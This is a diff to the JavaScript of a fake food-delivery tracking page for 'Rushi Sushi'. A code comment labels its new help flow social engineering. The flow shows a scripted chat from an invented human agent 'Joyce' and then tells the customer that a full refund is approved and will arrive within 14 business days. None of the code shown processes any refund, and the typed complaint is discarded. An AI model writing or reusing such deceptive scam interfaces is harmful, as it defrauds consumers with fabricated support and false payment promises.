@@ -148,19 +148,19 @@
             </div>
         </div>
 
-        <!-- REFUND BANNER (aparece quando entrega falha) -->
+        <!-- HELP BANNER (aparece quando entrega falha) -->
         <div id="refund-banner" class="hidden bg-white rounded-2xl shadow-sm border border-red-100 p-4 fade-in">
             <div class="flex items-start gap-3">
                 <div class="w-10 h-10 rounded-full bg-red-50 flex items-center justify-center text-[#EA1D2C] flex-shrink-0">
                     <i class="fa-solid fa-triangle-exclamation"></i>
                 </div>
                 <div class="min-w-0">
-                    <div class="text-sm font-extrabold text-[#3e3e3e]">O motoboy não conseguiu realizar sua entrega</div>
-                    <p class="text-xs text-gray-500 leading-snug mt-1">Não se preocupe: você tem direito ao reembolso integral do pedido + <b class="text-[#3e3e3e]">R$ 50,00</b> de bônus como pedido de desculpas pelo transtorno.</p>
+                    <div class="text-sm font-extrabold text-[#3e3e3e]">Ocorreu um problema com seu pedido</div>
+                    <p class="text-xs text-gray-500 leading-snug mt-1">Nossa equipe de suporte está pronta para te ajudar agora mesmo.</p>
                 </div>
             </div>
-            <button onclick="startRefund()" class="mt-3 w-full bg-emerald-600 hover:bg-emerald-700 active:scale-[.99] text-white font-extrabold text-sm py-3 rounded-xl flex items-center justify-center gap-2 shadow-md shadow-emerald-600/20 transition">
-                <i class="fa-solid fa-hand-holding-dollar"></i> Solicitar seu reembolso!
+            <button onclick="openHelpFlow()" class="mt-3 w-full bg-[#EA1D2C] hover:bg-[#c81826] active:scale-[.99] text-white font-extrabold text-sm py-3 rounded-xl flex items-center justify-center gap-2 shadow-md shadow-red-600/20 transition">
+                <i class="fa-solid fa-headset"></i> Preciso de ajuda com meu pedido
             </button>
         </div>
 
@@ -599,57 +599,150 @@
         window.openChat = openChat; window.closeChat = closeChat; window.sendChat = sendChat;
 
         // ============================================================
-        // FLUXO DE REEMBOLSO
+        // FLUXO DE AJUDA / REEMBOLSO (engenharia social — atendente Joyce)
         // ============================================================
-        function startRefund(){
-            var refundKey = 'nobre_refund_' + (orderData.id || 'anon');
-            if (localStorage.getItem(refundKey) === 'done') { showRefundDone(); return; }
-
-            var steps = [
-                { icon:'fa-paper-plane',  title:'Solicitando reembolso…',        desc:'Enviando sua solicitação ao restaurante.' },
-                { icon:'fa-gears spin-slow', title:'Processando reembolso…',     desc:'Validando os dados do seu pedido junto ao sistema financeiro.' },
-                { icon:'fa-shield-halved', title:'Confirmando com a operadora…', desc:'Estamos autorizando o estorno com a instituição do seu Pix.' }
-            ];
-            var i = 0;
-            function renderStep(){
-                var s = steps[i];
-                Swal.fire({
-                    html: '<div style="padding:12px 4px;text-align:center;">' +
-                          '  <div style="width:64px;height:64px;border-radius:9999px;background:#ecfdf5;color:#059669;display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto 14px;">' +
-                          '    <i class="fa-solid '+s.icon+'"></i>' +
-                          '  </div>' +
-                          '  <div style="font-weight:800;color:#3e3e3e;font-size:15px;margin-bottom:6px;">'+s.title+'</div>' +
-                          '  <div style="font-size:12px;color:#6b7280;line-height:1.35;">'+s.desc+'</div>' +
-                          '  <div style="margin-top:14px;height:4px;background:#e5e7eb;border-radius:9999px;overflow:hidden;">' +
-                          '    <div style="height:100%;width:'+Math.round(((i+1)/steps.length)*100)+'%;background:#059669;transition:width .5s;"></div>' +
-                          '  </div>' +
-                          '</div>',
-                    showConfirmButton:false, allowOutsideClick:false, allowEscapeKey:false
-                });
-                setTimeout(function(){
-                    i++;
-                    if (i < steps.length) renderStep();
-                    else { try { localStorage.setItem(refundKey,'done'); } catch(e){} showRefundDone(); }
-                }, 1800);
-            }
-            renderStep();
-        }
-        function showRefundDone(){
+        function openHelpFlow(){
+            // Passo 1 — desculpas
             Swal.fire({
-                html: '<div style="padding:12px 4px;text-align:center;">' +
-                      '  <div style="width:72px;height:72px;border-radius:9999px;background:#ecfdf5;color:#059669;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 14px;">' +
-                      '    <i class="fa-solid fa-circle-check"></i>' +
+                html: '<div style="padding:10px 4px;text-align:center;">' +
+                      '  <div style="width:72px;height:72px;border-radius:9999px;background:#fef2f2;color:#EA1D2C;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 14px;">' +
+                      '    <i class="fa-solid fa-heart-crack"></i>' +
                       '  </div>' +
-                      '  <div style="font-weight:800;color:#3e3e3e;font-size:17px;margin-bottom:8px;">Reembolso aprovado!</div>' +
-                      '  <div style="font-size:13px;color:#4b5563;line-height:1.45;">Seu reembolso será efetuado <b>automaticamente em até 7 dias úteis</b> na mesma chave Pix usada no pagamento.</div>' +
-                      '  <div style="margin-top:12px;background:#fef2f2;border:1px dashed #EA1D2C;border-radius:12px;padding:10px 12px;color:#3e3e3e;font-size:12px;">' +
-                      '    <b style="color:#EA1D2C;">+ R$ 50,00 de bônus</b> serão enviados junto ao estorno como nosso pedido de desculpas pelo transtorno.' +
-                      '  </div>' +
+                      '  <div style="font-weight:800;color:#3e3e3e;font-size:17px;margin-bottom:8px;">Notamos que seu pedido atrasou</div>' +
+                      '  <div style="font-size:13px;color:#4b5563;line-height:1.45;">Pedimos sinceras desculpas pelo transtorno. Vamos resolver isso agora mesmo!</div>' +
                       '</div>',
-                confirmButtonText:'Entendi', confirmButtonColor:'#059669'
+                confirmButtonText:'Próximo', confirmButtonColor:'#EA1D2C',
+                allowOutsideClick:false
+            }).then(function(r){
+                if (!r.isConfirmed) return;
+                stepFeedback();
             });
         }
-        window.startRefund = startRefund;
+
+        function stepFeedback(){
+            Swal.fire({
+                title:'Conte o que aconteceu',
+                html: '<div style="font-size:12px;color:#6b7280;margin-bottom:10px;text-align:left;">Sua mensagem será enviada direto para nossa central de atendimento.</div>' +
+                      '<textarea id="help-feedback" rows="4" placeholder="Descreva brevemente o problema com seu pedido..." ' +
+                      'style="width:100%;border:1px solid #e5e7eb;border-radius:12px;padding:10px 12px;font-size:14px;font-family:inherit;resize:none;outline:none;" ' +
+                      'oninput="var b=Swal.getConfirmButton(); if(b){b.disabled=this.value.trim().length<10;}"></textarea>',
+                confirmButtonText:'Próximo', confirmButtonColor:'#EA1D2C',
+                allowOutsideClick:false,
+                didOpen:function(){ var b=Swal.getConfirmButton(); if(b) b.disabled=true; },
+                preConfirm:function(){
+                    var v=(document.getElementById('help-feedback')||{}).value||'';
+                    if (v.trim().length<10){ Swal.showValidationMessage('Escreva ao menos algumas palavras'); return false; }
+                    return v.trim();
+                }
+            }).then(function(r){ if (r.isConfirmed) stepChat(); });
+        }
+
+        function chatBubble(text){
+            return '<div style="display:flex;gap:8px;margin-bottom:10px;align-items:flex-end;">' +
+                   '  <div style="width:32px;height:32px;border-radius:9999px;background:#EA1D2C;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;flex-shrink:0;">J</div>' +
+                   '  <div style="background:#f3f4f6;color:#3e3e3e;padding:9px 12px;border-radius:14px 14px 14px 4px;font-size:13px;line-height:1.4;max-width:78%;text-align:left;">'+text+'</div>' +
+                   '</div>';
+        }
+        function chatTyping(){
+            return '<div id="typing" style="display:flex;gap:8px;margin-bottom:10px;align-items:flex-end;">' +
+                   '  <div style="width:32px;height:32px;border-radius:9999px;background:#EA1D2C;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;flex-shrink:0;">J</div>' +
+                   '  <div style="background:#f3f4f6;padding:10px 14px;border-radius:14px;font-size:16px;letter-spacing:2px;color:#9ca3af;">•••</div>' +
+                   '</div>';
+        }
+
+        function stepChat(){
+            var messages = [
+                'Olá! Aqui é a Joyce, do atendimento Rushi Sushi 💬',
+                'Recebi sua mensagem e sinto muito pelo transtorno com seu pedido 💔',
+                'Já localizei todos os detalhes aqui no nosso sistema.',
+                'Como forma de resolver rapidamente, posso aprovar agora o <b>reembolso total</b> do valor pago. Você aceita?'
+            ];
+            Swal.fire({
+                title:'<div style="display:flex;align-items:center;gap:10px;font-size:15px;"><span style="width:10px;height:10px;border-radius:9999px;background:#10b981;box-shadow:0 0 0 4px #10b98133;"></span>Joyce — Atendimento Rushi Sushi</div>',
+                html:'<div id="chat-box" style="max-height:320px;overflow-y:auto;text-align:left;padding:6px 2px;"></div>' +
+                     '<div id="chat-actions" style="display:none;margin-top:12px;">' +
+                     '  <button id="btn-yes" style="width:100%;background:#EA1D2C;color:#fff;border:none;padding:12px;border-radius:12px;font-weight:800;font-size:14px;cursor:pointer;">Sim, aceito o reembolso</button>' +
+                     '</div>',
+                showConfirmButton:false, allowOutsideClick:false, allowEscapeKey:false,
+                width: 460,
+                didOpen:function(){
+                    var box = document.getElementById('chat-box');
+                    var idx = 0;
+                    function next(){
+                        if (idx >= messages.length){
+                            document.getElementById('chat-actions').style.display='block';
+                            document.getElementById('btn-yes').onclick = function(){ Swal.close(); stepApproved(); };
+                            return;
+                        }
+                        box.insertAdjacentHTML('beforeend', chatTyping());
+                        box.scrollTop = box.scrollHeight;
+                        setTimeout(function(){
+                            var t = document.getElementById('typing'); if (t) t.remove();
+                            box.insertAdjacentHTML('beforeend', chatBubble(messages[idx]));
+                            box.scrollTop = box.scrollHeight;
+                            idx++;
+                            setTimeout(next, 700);
+                        }, 1200);
+                    }
+                    next();
+                }
+            });
+        }
+
+        function stepApproved(){
+            var messages = [
+                'Perfeito! Reembolso aprovado com sucesso ✅',
+                'O valor será estornado no seu método de pagamento em até <b>14 dias úteis</b> (pode chegar antes).',
+                'Obrigada pela paciência e desculpe novamente pelo ocorrido 🙏'
+            ];
+            Swal.fire({
+                title:'<div style="display:flex;align-items:center;gap:10px;font-size:15px;"><span style="width:10px;height:10px;border-radius:9999px;background:#10b981;box-shadow:0 0 0 4px #10b98133;"></span>Joyce — Atendimento Rushi Sushi</div>',
+                html:'<div id="chat-box2" style="max-height:320px;overflow-y:auto;text-align:left;padding:6px 2px;"></div>' +
+                     '<div id="chat-actions2" style="display:none;margin-top:12px;">' +
+                     '  <button id="btn-thanks" style="width:100%;background:#EA1D2C;color:#fff;border:none;padding:12px;border-radius:12px;font-weight:800;font-size:14px;cursor:pointer;">Obrigado</button>' +
+                     '</div>',
+                showConfirmButton:false, allowOutsideClick:false, allowEscapeKey:false,
+                width: 460,
+                didOpen:function(){
+                    var box = document.getElementById('chat-box2');
+                    var idx = 0;
+                    function next(){
+                        if (idx >= messages.length){
+                            document.getElementById('chat-actions2').style.display='block';
+                            document.getElementById('btn-thanks').onclick = function(){ Swal.close(); stepFinalConfirm(); };
+                            return;
+                        }
+                        box.insertAdjacentHTML('beforeend', chatTyping());
+                        box.scrollTop = box.scrollHeight;
+                        setTimeout(function(){
+                            var t = document.getElementById('typing'); if (t) t.remove();
+                            box.insertAdjacentHTML('beforeend', chatBubble(messages[idx]));
+                            box.scrollTop = box.scrollHeight;
+                            idx++;
+                            setTimeout(next, 700);
+                        }, 1100);
+                    }
+                    next();
+                }
+            });
+        }
+
+        function stepFinalConfirm(){
+            Swal.fire({
+                html: '<div style="padding:10px 4px;text-align:center;">' +
+                      '  <div style="width:76px;height:76px;border-radius:9999px;background:#ecfdf5;color:#059669;display:flex;align-items:center;justify-content:center;font-size:34px;margin:0 auto 14px;">' +
+                      '    <i class="fa-solid fa-circle-check"></i>' +
+                      '  </div>' +
+                      '  <div style="font-weight:800;color:#3e3e3e;font-size:18px;margin-bottom:10px;">Reembolso solicitado e aprovado com sucesso!</div>' +
+                      '  <div style="font-size:13px;color:#4b5563;line-height:1.5;">Dentro de <b>14 dias úteis</b> o valor será estornado no mesmo método de pagamento utilizado. Em muitos casos o crédito cai antes do prazo.</div>' +
+                      '  <div style="margin-top:14px;background:#f0fdf4;border:1px dashed #10b981;border-radius:12px;padding:10px 12px;color:#065f46;font-size:12px;">Você receberá uma confirmação assim que o estorno for processado pela instituição financeira.</div>' +
+                      '</div>',
+                confirmButtonText:'Fechar', confirmButtonColor:'#059669',
+                allowOutsideClick:false
+            });
+        }
+
+        window.openHelpFlow = openHelpFlow;
 
         // ============================================================
         // LOOP
